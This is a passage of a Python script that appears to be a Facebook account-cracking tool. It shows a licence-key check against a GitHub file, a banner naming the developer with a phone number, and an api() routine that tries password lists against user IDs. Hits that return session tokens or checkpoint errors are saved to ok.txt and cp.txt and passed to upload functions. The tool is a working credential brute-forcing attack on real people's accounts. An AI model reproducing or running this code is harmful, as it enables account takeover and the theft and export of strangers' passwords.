...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/link.copy.kor.ar.xuda.kha.magi"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/link.copy.kor.ar.xuda.kha.magi")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/skcayber/approval/blob/main/nazim-approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;91m ..###..###..####.##....##.####.........##....##.####.##....##..######..
 ...
 > \033[0;96mDEVELOPER     : NAZIM
 > \033[0;96mFACEBOOK ID   : NAZIM AHMED
 > \033[0;96mWHATSAPP      : +8801876276757
 \033[0;96m> GITHUB        : skcayber
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Nazim): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[NAZIM-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [NAZIM-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[NAZIM-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [NAZIM-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
